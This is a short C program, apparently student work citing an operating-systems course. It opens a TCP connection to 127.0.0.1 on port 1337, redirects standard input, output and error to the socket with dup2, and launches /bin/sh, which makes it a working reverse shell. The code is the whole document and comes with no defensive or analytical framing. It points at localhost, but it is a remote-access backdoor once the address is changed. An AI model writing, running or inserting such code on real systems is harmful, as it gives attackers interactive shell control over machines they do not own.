#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//I used my homework in os course for the socket and dup2 programming
int main(){
    //we did something similar in operating systems course
    struct sockaddr_in addr;
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(1337);  //port
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);
    dup2(sock, STDIN_FILENO);
    char *args[] = {"/bin/sh", NULL};
    execv("/bin/sh", args);

}
